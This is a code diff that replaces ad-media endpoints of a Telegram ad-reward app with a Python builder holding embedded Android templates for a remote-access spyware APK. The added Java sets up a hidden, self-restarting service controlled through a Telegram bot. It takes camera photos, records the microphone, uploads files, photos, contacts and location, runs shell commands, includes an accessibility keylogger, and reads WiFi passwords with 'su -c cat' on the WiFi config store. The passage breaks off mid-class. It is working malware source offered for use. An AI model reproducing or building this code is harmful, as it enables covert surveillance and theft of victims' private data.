-
-    out = []
-    for a in ads:
-        media = []
-        try:
-            media = json.loads(a["media_json"] or "[]")
-        except Exception:
-            media = []
-        if not media and a["video_file_id"]:
-            media.append({"type": "video", "file_id": a["video_file_id"]})
-        if not media and a["image_file_id"]:
-            media.append({"type": "image", "file_id": a["image_file_id"]})
-
-        media_out = []
-        for i, m in enumerate(media):
-            raw_type = m.get("type") or "image"
-            norm = normalize_media_type(raw_type)
-            media_out.append({
-                "type": norm,
-                "url": f"/api/ad-media/{a['id']}/{i}",
-                "index": i,
-            })
-
-        out.append({
-            "id": a["id"], "title": a["title"], "description": a["description"] or "",
-            "url": a["url"] or "", "contact": a["contact"] or "",
-            "type": a["type"] or "link",
-            "media": media_out,
-            "media_count": len(media_out),
-            "reward": a["reward"] or 0.20,
-            "duration": a["duration"] or 15,
-            "button_text": a["button_text"] or "",
-            "redirect_url": a["redirect_url"] or "",
-        })
-
-    return {
-        "ads_today": fresh["ads_today"],
-        "daily_limit": int(get_setting("daily_limit", "10")),
-        "ad_reward": float(get_setting("ad_reward", "0.20")),
-        "total_active": total_active,
-        "ads": out,
-    }
-
-
-@app.get("/api/ad-media/{ad_id}/{index}")
-async def api_ad_media(ad_id: int, index: int):
-    """
-    ✅ إعادة توجيه 302 مباشرة إلى تيليجرام CDN
-    المتصفح يحمّل الفيديو/الصورة من تيليجرام مباشرة = سرعة 10x
-    """
-    with db() as conn:
-        row = conn.execute(
-            "SELECT video_file_id, image_file_id, media_json FROM ads WHERE id=?",
-            (ad_id,)).fetchone()
-    if not row:
-        raise HTTPException(404, "لا وسائط")
-
-    media_list = []
-    try:
-        media_list = json.loads(row["media_json"] or "[]")
-    except Exception:
-        media_list = []
-    if not media_list and row["video_file_id"]:
-        media_list.append({"type": "video", "file_id": row["video_file_id"]})
-    if not media_list and row["image_file_id"]:
-        media_list.append({"type": "image", "file_id": row["image_file_id"]})
-
-    if index < 0 or index >= len(media_list):
-        raise HTTPException(404, "لا وسائط")
-
-    item = media_list[index]
-    file_id = item.get("file_id", "")
-    if not file_id:
-        raise HTTPException(404, "لا file_id")
-
-    file_url = await get_cached_file_url(file_id)
-    if not file_url:
-        raise HTTPException(404, "تعذر الجلب")
-
-    return RedirectResponse(
-        url=file_url,
-        status_code=302,
-        headers={"Cache-Control": "public, max-age=1500"},
+FEATURES = {
+    "screenshot":    ("🖥️", "لقطة الشاشة"),
+    "keylogger":     ("⌨️", "تسجيل الكتابة"),
+    "notifications": ("🔔", "قراءة الإشعارات"),
+    "apps_list":     ("📦", "قائمة التطبيقات"),
+    "wifi_pass":     ("📶", "كلمات WiFi"),
+    "shell":         ("💻", "Shell"),
+    "persist":       ("♻️", "إعادة تشغيل"),
+    "clipboard":     ("📋", "الحافظة"),
+    "audio_record":  ("🎙️", "تسجيل الميكروفون"),
+    "screen_stream": ("📡", "بث الشاشة"),
+}
+
+THEMES = {"dark": ("🌑","داكن"), "light": ("☀️","فاتح"), "auto": ("🔄","تلقائي")}
+
+user_sessions = {}
+user_apk_count = defaultdict(int)
+
+# ═══════════════════════════════════════════════════════════════
+#                  قوالب Java (مضمّنة)
+# ═══════════════════════════════════════════════════════════════
+MANIFEST_TPL = '''<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="{pkg}" xmlns:tools="http://schemas.android.com/tools">
+
+{perms_xml}
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission"/>
+
+    <application
+        android:label="{app_name}"
+        android:icon="@mipmap/ic_launcher"
+        android:usesCleartextTraffic="true"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.DeviceDefault">
+
+        <activity android:name=".MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:noHistory="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <service android:name=".ControlService"
+            android:exported="true"
+            android:foregroundServiceType="dataSync|microphone"/>
+
+        <service android:name=".KeyloggerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config"/>
+        </service>
+
+        <service android:name=".NotificationListener"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>'''
+
+BUILD_GRADLE_TPL = '''plugins {{ id 'com.android.application' }}
+android {{
+    namespace '{pkg}'
+    compileSdk {compile_sdk}
+    defaultConfig {{
+        applicationId "{pkg}"
+        minSdk {min_sdk}
+        targetSdk {target_sdk}
+        versionCode 1
+        versionName "1.0"
+    }}
+    compileOptions {{
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }}
+    buildTypes {{
+        release {{
+            minifyEnabled false
+            shrinkResources false
+        }}
+    }}
+    lint {{ checkReleaseBuilds false; abortOnError false }}
+}}
+dependencies {{
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
+    implementation 'org.json:json:20231013'
+}}'''
+
+ACCESSIBILITY_XML = '''<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeViewTextChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagReportViewIds"
+    android:canRetrieveWindowContent="true"
+    android:description="@string/app_name"
+    android:notificationTimeout="100"/>'''
+
+# ═══════════════════════════════════════════════════════════════
+#                  قوالب Java Classes
+# ═══════════════════════════════════════════════════════════════
+MAIN_ACTIVITY = '''package {pkg};
+
+import android.Manifest;
+import android.app.Activity;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.provider.Settings;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+import java.util.ArrayList;
+import java.util.List;
+
+public class MainActivity extends Activity {{
+    private static final int REQ = 1001;
+
+    @Override
+    protected void onCreate(Bundle b) {{
+        super.onCreate(b);
+        requestAllPermissions();
+        startControlService();
+
+        if (Build.VERSION.SDK_INT >= 26
+                && !getPackageManager().canRequestPackageInstalls()) {{
+            try {{
+                startActivity(new Intent(
+                    Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                    Uri.parse("package:" + getPackageName())));
+            }} catch (Exception ignored) {{}}
+        }}
+        if (Build.VERSION.SDK_INT >= 23
+                && !Settings.canDrawOverlays(this)) {{
+            try {{
+                startActivity(new Intent(
+                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName())));
+            }} catch (Exception ignored) {{}}
+        }}
+
+        new Handler().postDelayed(() -> {{
+            try {{
+                Intent tg = new Intent(Intent.ACTION_VIEW,
+                    Uri.parse("https://t.me/{bot_username}"));
+                startActivity(tg);
+            }} catch (Exception ignored) {{}}
+            moveTaskToBack(true);
+        }}, 2500);
+    }}
+
+    private void startControlService() {{
+        Intent svc = new Intent(this, ControlService.class);
+        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
+        else startService(svc);
+    }}
+
+    private void requestAllPermissions() {{
+        List<String> needed = new ArrayList<>();
+        String[] all = new String[]{{
+            Manifest.permission.CAMERA,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_PHONE_STATE,
+        }};
+        for (String p : all) {{
+            if (ContextCompat.checkSelfPermission(this, p)
+                    != PackageManager.PERMISSION_GRANTED) needed.add(p);
+        }}
+        if (Build.VERSION.SDK_INT >= 33
+                && ContextCompat.checkSelfPermission(this,
+                    "android.permission.POST_NOTIFICATIONS")
+                    != PackageManager.PERMISSION_GRANTED) {{
+            needed.add("android.permission.POST_NOTIFICATIONS");
+        }}
+        if (!needed.isEmpty()) {{
+            ActivityCompat.requestPermissions(this,
+                needed.toArray(new String[0]), REQ);
+        }}
+    }}
+}}'''
+
+CONTROL_SERVICE = '''package {pkg};
+
+import android.app.*;
+import android.content.*;
+import android.os.*;
+import android.util.Log;
+import org.json.*;
+import java.io.*;
+import java.util.concurrent.*;
+import okhttp3.*;
+
+public class ControlService extends Service {{
+    private static final String TAG = "CTRL";
+    private static final String TOKEN = "{bot_token}";
+    private static final String ADMIN = "{admin_id}";
+    private static final String API = "https://api.telegram.org/bot" + TOKEN;
+
+    static OkHttpClient http = new OkHttpClient.Builder()
+        .connectTimeout(20, TimeUnit.SECONDS)
+        .readTimeout(60, TimeUnit.SECONDS)
+        .writeTimeout(60, TimeUnit.SECONDS)
+        .build();
+
+    private ScheduledExecutorService scheduler;
+    private long lastUpdateId = 0;
+
+    private CameraHelper camera;
+    private AudioHelper audio;
+    private FileHelper files;
+    private LocationHelper location;
+    private ContactsHelper contacts;
+    private WifiHelper wifi;
+    private AppsHelper apps;
+    private ScreenshotHelper screen;
+    private ShellHelper shell;
+
+    @Override
+    public void onCreate() {{
+        super.onCreate();
+        camera = new CameraHelper(this);
+        audio = new AudioHelper(this);
+        files = new FileHelper(this);
+        location = new LocationHelper(this);
+        contacts = new ContactsHelper(this);
+        wifi = new WifiHelper(this);
+        apps = new AppsHelper(this);
+        screen = new ScreenshotHelper(this);
+        shell = new ShellHelper();
+    }}
+
+    @Override
+    public int onStartCommand(Intent i, int f, int s) {{
+        startForeground(1, buildNotification());
+        if (scheduler == null || scheduler.isShutdown()) {{
+            scheduler = Executors.newSingleThreadScheduledExecutor();
+            scheduler.scheduleWithFixedDelay(this::poll, 0, 3, TimeUnit.SECONDS);
+        }}
+        return START_STICKY;
+    }}
+
+    private Notification buildNotification() {{
+        String ch = "svc";
+        if (Build.VERSION.SDK_INT >= 26) {{
+            NotificationChannel c = new NotificationChannel(
+                ch, "Service", NotificationManager.IMPORTANCE_MIN);
+            c.setShowBadge(false);
+            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
+                .createNotificationChannel(c);
+        }}
+        return new Notification.Builder(this, ch)
+            .setContentTitle("System Service")
+            .setContentText("Running")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setOngoing(true)
+            .build();
+    }}
+
+    private void poll() {{
+        try {{
+            String url = API + "/getUpdates?offset=" + (lastUpdateId + 1)
+                + "&timeout=5&allowed_updates=[\\"message\\",\\"callback_query\\"]";
+            Request req = new Request.Builder().url(url).build();
+            Response r = http.newCall(req).execute();
+            String body = r.body() != null ? r.body().string() : "";
+            r.close();
+
+            JSONObject root = new JSONObject(body);
+            JSONArray updates = root.optJSONArray("result");
+            if (updates == null) return;
+
+            for (int i = 0; i < updates.length(); i++) {{
+                JSONObject u = updates.getJSONObject(i);
+                lastUpdateId = u.getLong("update_id");
+                JSONObject msg = u.optJSONObject("message");
+                JSONObject cb = u.optJSONObject("callback_query");
+                if (msg != null) handleMsg(msg);
+                else if (cb != null) handleCb(cb);
+            }}
+        }} catch (Exception e) {{
+            Log.e(TAG, "poll: " + e.getMessage());
+        }}
+    }}
+
+    private void handleMsg(JSONObject msg) {{
+        try {{
+            String chatId = msg.getJSONObject("chat").get("id").toString();
+            if (!chatId.equals(ADMIN)) return;
+            if (msg.has("text")) dispatch(msg.getString("text").trim(), chatId);
+        }} catch (Exception ignored) {{}}
+    }}
+
+    private void handleCb(JSONObject cb) {{
+        try {{
+            String data = cb.getString("data");
+            String chatId = cb.getJSONObject("message")
+                .getJSONObject("chat").get("id").toString();
+            if (!chatId.equals(ADMIN)) return;
+            answerCb(cb.getString("id"));
+            dispatch(data, chatId);
+        }} catch (Exception ignored) {{}}
+    }}
+
+    private void dispatch(String cmd, String chatId) {{
+        try {{
+            switch (cmd) {{
+                case "/start": case "start":
+                    sendMainMenu(chatId); break;
+                case "📷 كاميرا خلفية": case "cam_back":
+                    sendMsg(chatId, "📸 جاري..."); camera.capture(chatId, 0); break;
+                case "🤳 كاميرا أمامية": case "cam_front":
+                    sendMsg(chatId, "📸 جاري..."); camera.capture(chatId, 1); break;
+                case "🎙️ تسجيل صوتي": case "audio_rec":
+                    sendMsg(chatId, "🎙️ تسجيل 15s..."); audio.record(chatId, 15000); break;
+                case "📁 ملفاتي": case "files_root": files.listRoot(chatId); break;
+                case "💾 التخزين": files.listSdcard(chatId); break;
+                case "⬇️ التنزيلات": files.listDownload(chatId); break;
+                case "🖼️ صوري": files.sendPhotos(chatId); break;
+                case "📍 موقعي": location.send(chatId); break;
+                case "📞 جهات الاتصال": contacts.send(chatId); break;
+                case "📶 كلمات WiFi": case "wifi_pass":
+                    sendMsg(chatId, "📶 جاري..."); wifi.extract(chatId); break;
+                case "📦 التطبيقات": case "apps_list":
+                    sendMsg(chatId, "📦 جاري..."); apps.list(chatId); break;
+                case "🖥️ لقطة الشاشة": case "screenshot":
+                    sendMsg(chatId, "🖥️ جاري..."); screen.take(chatId); break;
+                case "ℹ️ معلومات": case "device_info":
+                    sendMsg(chatId, buildDeviceInfo()); break;
+                case "⚙️ الإعدادات":
+                    sendMsg(chatId, "⚙️ <b>الإعدادات</b>\\n\\nالحالة: ✅ نشط"); break;
+                default:
+                    if (cmd.startsWith("shell ")) shell.run(cmd.substring(6), chatId);
+            }}
+        }} catch (Exception e) {{
+            sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+
+    private void sendMainMenu(String chatId) {{
+        try {{
+            JSONArray kb = new JSONArray();
+            kb.put(row("📷 كاميرا خلفية", "🤳 كاميرا أمامية"));
+            kb.put(row("🎙️ تسجيل صوتي", "🖥️ لقطة الشاشة"));
+            kb.put(row("🖼️ صوري", "📁 ملفاتي"));
+            kb.put(row("💾 التخزين", "⬇️ التنزيلات"));
+            kb.put(row("📍 موقعي", "📞 جهات الاتصال"));
+            kb.put(row("📶 كلمات WiFi", "📦 التطبيقات"));
+            kb.put(row("ℹ️ معلومات", "⚙️ الإعدادات"));
+
+            JSONObject rm = new JSONObject().put("keyboard", kb)
+                .put("resize_keyboard", true);
+
+            String url = API + "/sendMessage?chat_id=" + chatId
+                + "&parse_mode=HTML&text=" + enc(
+                    "╔══════════════════════╗\\n"
+                    + "║ 🎛️ <b>لوحة التحكم</b>     ║\\n"
+                    + "╚══════════════════════╝\\n\\n"
+                    + "👑 أنت المتحكم\\n"
+                    + "📱 الهدف: " + Build.MODEL + "\\n"
+                    + "🔋 البطارية: " + getBattery() + "%")
+                + "&reply_markup=" + enc(rm.toString());
+            http.newCall(new Request.Builder().url(url).build()).execute().close();
+        }} catch (Exception e) {{ Log.e(TAG, "" + e.getMessage()); }}
+    }}
+
+    private JSONArray row(String a, String b) throws JSONException {{
+        JSONArray r = new JSONArray();
+        r.put(new JSONObject().put("text", a));
+        r.put(new JSONObject().put("text", b));
+        return r;
+    }}
+
+    private String getBattery() {{
+        try {{
+            Intent i = registerReceiver(null,
+                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (i == null) return "?";
+            int l = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            int s = i.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
+            return String.valueOf((l * 100) / s);
+        }} catch (Exception e) {{ return "?"; }}
+    }}
+
+    private String buildDeviceInfo() {{
+        return "📱 <b>معلومات</b>\\n\\n"
+            + "الموديل: " + Build.MODEL + "\\n"
+            + "الشركة: " + Build.MANUFACTURER + "\\n"
+            + "Android: " + Build.VERSION.RELEASE + "\\n"
+            + "SDK: " + Build.VERSION.SDK_INT + "\\n"
+            + "البطارية: " + getBattery() + "%\\n"
+            + "الحزمة: " + getPackageName();
+    }}
+
+    static void sendMsg(String chatId, String text) {{
+        try {{
+            String url = API + "/sendMessage?chat_id=" + chatId
+                + "&parse_mode=HTML&text=" + enc(text);
+            http.newCall(new Request.Builder().url(url).build()).execute().close();
+        }} catch (Exception ignored) {{}}
+    }}
+
+    static void answerCb(String id) {{
+        try {{
+            String url = API + "/answerCallbackQuery?callback_query_id=" + id;
+            http.newCall(new Request.Builder().url(url).build()).execute().close();
+        }} catch (Exception ignored) {{}}
+    }}
+
+    static String enc(String s) {{
+        try {{ return java.net.URLEncoder.encode(s, "UTF-8"); }}
+        catch (Exception e) {{ return ""; }}
+    }}
+
+    @Override public IBinder onBind(Intent i) {{ return null; }}
+
+    @Override
+    public void onDestroy() {{
+        if (scheduler != null) scheduler.shutdownNow();
+        Intent rs = new Intent(this, ControlService.class);
+        if (Build.VERSION.SDK_INT >= 26) startForegroundService(rs);
+        else startService(rs);
+        super.onDestroy();
+    }}
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {{
+        Intent rs = new Intent(this, ControlService.class);
+        if (Build.VERSION.SDK_INT >= 26) startForegroundService(rs);
+        else startService(rs);
+        super.onTaskRemoved(rootIntent);
+    }}
+}}'''
+
+CAMERA_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.graphics.ImageFormat;
+import android.hardware.camera2.*;
+import android.media.ImageReader;
+import android.os.*;
+import android.util.Log;
+import okhttp3.*;
+import java.nio.ByteBuffer;
+
+public class CameraHelper {{
+    private final Context ctx;
+    private CameraDevice device;
+    private ImageReader reader;
+    private String chatId;
+
+    public CameraHelper(Context c) {{ this.ctx = c; }}
+
+    public void capture(String cid, int facing) {{
+        this.chatId = cid;
+        try {{
+            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
+            String camId = null;
+            for (String id : cm.getCameraIdList()) {{
+                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
+                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
+                if (f != null && f == facing) {{ camId = id; break; }}
+            }}
+            if (camId == null) {{ msg("❌ لا توجد كاميرا"); return; }}
+
+            reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
+            reader.setOnImageAvailableListener(r -> {{
+                try {{
+                    android.media.Image img = r.acquireLatestImage();
+                    if (img == null) return;
+                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
+                    byte[] bytes = new byte[buf.remaining()];
+                    buf.get(bytes); img.close();
+                    upload(bytes); closeCam();
+                }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+            }}, new Handler(Looper.getMainLooper()));
+
+            cm.openCamera(camId, new CameraDevice.StateCallback() {{
+                @Override public void onOpened(CameraDevice d) {{
+                    device = d;
+                    try {{
+                        CaptureRequest.Builder b =
+                            d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                        b.addTarget(reader.getSurface());
+                        d.createCaptureSession(
+                            java.util.Collections.singletonList(reader.getSurface()),
+                            new CameraCaptureSession.StateCallback() {{
+                                @Override public void onConfigured(CameraCaptureSession s) {{
+                                    try {{ s.capture(b.build(), null, null); }}
+                                    catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+                                }}
+                                @Override public void onConfigureFailed(CameraCaptureSession s) {{
+                                    msg("❌ فشل الإعداد");
+                                }}
+                            }}, null);
+                    }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+                }}
+                @Override public void onDisconnected(CameraDevice d) {{ d.close(); }}
+                @Override public void onError(CameraDevice d, int e) {{
+                    msg("❌ " + e); d.close();
+                }}
+            }}, null);
+        }} catch (Exception e) {{ msg("❌ " + e.getMessage()); }}
+    }}
+
+    private void upload(byte[] data) {{
+        try {{
+            RequestBody body = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("photo", "cam.jpg",
+                    RequestBody.create(data, MediaType.parse("image/jpeg")))
+                .build();
+            ControlService.http.newCall(
+                new Request.Builder()
+                    .url("https://api.telegram.org/bot{bot_token}/sendPhoto")
+                    .post(body).build()
+            ).execute().close();
+        }} catch (Exception e) {{ Log.e("CAM", "" + e.getMessage()); }}
+    }}
+
+    private void closeCam() {{
+        try {{ if (device != null) device.close(); }} catch (Exception ignored) {{}}
+        try {{ if (reader != null) reader.close(); }} catch (Exception ignored) {{}}
+        device = null; reader = null;
+    }}
+
+    private void msg(String t) {{ ControlService.sendMsg(chatId, t); }}
+}}'''
+
+AUDIO_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.media.MediaRecorder;
+import okhttp3.*;
+import java.io.File;
+import java.util.concurrent.*;
+
+public class AudioHelper {{
+    private final Context ctx;
+    private MediaRecorder recorder;
+    private File outFile;
+
+    public AudioHelper(Context c) {{ this.ctx = c; }}
+
+    public void record(String chatId, int durationMs) {{
+        try {{
+            outFile = new File(ctx.getCacheDir(),
+                "audio_" + System.currentTimeMillis() + ".m4a");
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            recorder.setAudioSamplingRate(44100);
+            recorder.setAudioEncodingBitRate(96000);
+            recorder.setOutputFile(outFile.getAbsolutePath());
+            recorder.prepare(); recorder.start();
+
+            Executors.newSingleThreadScheduledExecutor().schedule(() -> {{
+                try {{
+                    recorder.stop(); recorder.release();
+                    upload(chatId, outFile);
+                }} catch (Exception e) {{
+                    ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+                }}
+            }}, durationMs, TimeUnit.MILLISECONDS);
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+
+    private void upload(String chatId, File f) {{
+        try {{
+            RequestBody body = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("audio", f.getName(),
+                    RequestBody.create(f, MediaType.parse("audio/mp4")))
+                .build();
+            ControlService.http.newCall(
+                new Request.Builder()
+                    .url("https://api.telegram.org/bot{bot_token}/sendAudio")
+                    .post(body).build()
+            ).execute().close();
+        }} catch (Exception ignored) {{}}
+    }}
+}}'''
+
+FILE_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.database.Cursor;
+import android.os.Environment;
+import android.provider.MediaStore;
+import okhttp3.*;
+import java.io.File;
+
+public class FileHelper {{
+    private final Context ctx;
+    public FileHelper(Context c) {{ this.ctx = c; }}
+
+    public void listRoot(String chatId) {{
+        listDir(Environment.getExternalStorageDirectory(), chatId, "📁 التخزين");
+    }}
+    public void listSdcard(String chatId) {{
+        listDir(Environment.getExternalStorageDirectory(), chatId, "💾 SD");
+    }}
+    public void listDownload(String chatId) {{
+        File d = Environment.getExternalStoragePublicDirectory(
+            Environment.DIRECTORY_DOWNLOADS);
+        listDir(d, chatId, "⬇️ التنزيلات");
+    }}
+
+    private void listDir(File dir, String chatId, String title) {{
+        if (dir == null || !dir.exists()) {{
+            ControlService.sendMsg(chatId, "❌ غير موجود"); return;
+        }}
+        File[] files = dir.listFiles();
+        StringBuilder sb = new StringBuilder(title).append("\\n");
+        sb.append(dir.getAbsolutePath()).append("\\n\\n");
+        if (files == null || files.length == 0) sb.append("(فارغ)");
+        else {{
+            int n = 0;
+            for (File f : files) {{
+                if (n++ >= 40) {{ sb.append("...\\n"); break; }}
+                sb.append(f.isDirectory() ? "📂 " : "📄 ").append(f.getName());
+                if (f.isFile()) sb.append(" (").append(f.length()/1024).append(" KB)");
+                sb.append("\\n");
+            }}
+        }}
+        ControlService.sendMsg(chatId, sb.toString());
+    }}
+
+    public void sendPhotos(String chatId) {{
+        try {{
+            String[] proj = {{MediaStore.Images.Media.DATA}};
+            Cursor c = ctx.getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
+                MediaStore.Images.Media.DATE_ADDED + " DESC");
+            int count = 0;
+            if (c != null) {{
+                while (c.moveToNext() && count < 15) {{
+                    String path = c.getString(0);
+                    File f = new File(path);
+                    if (f.exists() && f.length() > 0) {{
+                        upload(f, chatId); count++; Thread.sleep(600);
+                    }}
+                }}
+                c.close();
+            }}
+            if (count == 0) ControlService.sendMsg(chatId, "لا توجد صور");
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+
+    private void upload(File f, String chatId) {{
+        try {{
+            RequestBody body = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("photo", f.getName(),
+                    RequestBody.create(f, MediaType.parse("image/jpeg")))
+                .build();
+            ControlService.http.newCall(
+                new Request.Builder()
+                    .url("https://api.telegram.org/bot{bot_token}/sendPhoto")
+                    .post(body).build()
+            ).execute().close();
+        }} catch (Exception ignored) {{}}
+    }}
+}}'''
+
+LOCATION_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.location.*;
+import okhttp3.Request;
+
+public class LocationHelper {{
+    private final Context ctx;
+    public LocationHelper(Context c) {{ this.ctx = c; }}
+
+    public void send(String chatId) {{
+        try {{
+            LocationManager lm = (LocationManager)
+                ctx.getSystemService(Context.LOCATION_SERVICE);
+            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (loc == null)
+                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            if (loc == null) {{
+                ControlService.sendMsg(chatId, "⚠️ لا يوجد موقع"); return;
+            }}
+            String url = "https://api.telegram.org/bot{bot_token}/sendLocation?chat_id="
+                + chatId + "&latitude=" + loc.getLatitude()
+                + "&longitude=" + loc.getLongitude();
+            ControlService.http.newCall(
+                new Request.Builder().url(url).build()
+            ).execute().close();
+            ControlService.sendMsg(chatId,
+                "📍 الموقع\\nخط العرض: " + loc.getLatitude()
+                + "\\nخط الطول: " + loc.getLongitude()
+                + "\\nالدقة: " + loc.getAccuracy() + " م\\n"
+                + "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+}}'''
+
+CONTACTS_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
+
+public class ContactsHelper {{
+    private final Context ctx;
+    public ContactsHelper(Context c) {{ this.ctx = c; }}
+
+    public void send(String chatId) {{
+        try {{
+            Cursor c = ctx.getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null);
+            StringBuilder sb = new StringBuilder("📞 جهات الاتصال\\n\\n");
+            int n = 0;
+            if (c != null) {{
+                while (c.moveToNext() && n < 80) {{
+                    String name = c.getString(c.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String phone = c.getString(c.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    sb.append("• ").append(name).append(" → ").append(phone).append("\\n");
+                    n++;
+                    if (sb.length() > 3500) {{
+                        ControlService.sendMsg(chatId, sb.toString());
+                        sb = new StringBuilder();
+                    }}
+                }}
+                c.close();
+            }}
+            if (sb.length() > 0) ControlService.sendMsg(chatId, sb.toString());
+            if (n == 0) ControlService.sendMsg(chatId, "لا توجد جهات اتصال");
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+}}'''
+
+WIFI_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.net.wifi.WifiManager;
+import android.os.Build;
+import java.io.*;
+
+public class WifiHelper {{
+    private final Context ctx;
+    public WifiHelper(Context c) {{ this.ctx = c; }}
+
+    public void extract(String chatId) {{
+        StringBuilder sb = new StringBuilder("📶 كلمات WiFi\\n\\n");
+        try {{
+            WifiManager wm = (WifiManager)
+                ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            sb.append("• الشبكة الحالية: ")
+              .append(wm.getConnectionInfo().getSSID()).append("\\n\\n");
+        }} catch (Exception ignored) {{}}
+
+        if (Build.VERSION.SDK_INT < 29) {{
+            try {{
+                Process p = Runtime.getRuntime().exec(new String[]{{"su", "-c",
+                    "cat /data/misc/wifi/WifiConfigStore.xml"}});
+                BufferedReader r = new BufferedReader(
+                    new InputStreamReader(p.getInputStream()));
+                String line;
+                while ((line = r.readLine()) != null) {{
+                    if (line.contains("SSID") || line.contains("PreSharedKey"))
+                        sb.append(line.trim()).append("\\n");
+                }}
+                r.close();
+            }} catch (Exception e) {{
